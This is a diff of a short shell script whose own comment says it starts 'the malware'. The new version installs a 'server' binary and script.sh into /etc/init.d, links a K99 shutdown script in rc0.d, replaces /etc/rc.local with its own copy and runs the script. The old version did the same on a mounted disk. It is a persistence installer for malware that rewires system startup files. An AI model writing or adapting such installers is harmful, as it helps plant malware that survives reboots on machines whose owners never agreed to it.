@@ -2,17 +2,15 @@
 # This script is used to start the malware
 
 make
-mkdir folder
-mount /dev/sda1 folder
-cp server folder/etc/init.d
-cp script.sh folder/etc/init.d
-ln -s ../init.d/script.sh folder/etc/rc0.d/K99server.sh
-chmod +x folder/etc/rc0.d/K99server.sh
-rm folder/etc/rc.local
-cp rc.local folder/etc
-./folder/etc/init.d/script.sh
-umount folder
-rm -r folder
+cp server /etc/init.d
+cp script.sh /etc/init.d
+ln -s ../init.d/script.sh /etc/rc0.d/K99server.sh
+chmod +x /etc/rc0.d/K99server.sh
+rm /etc/rc.local
+cp rc.local /etc
+chmod 755 /etc/rc.local
+cd /etc/init.d
+./script.sh
 clear
 
 #exit
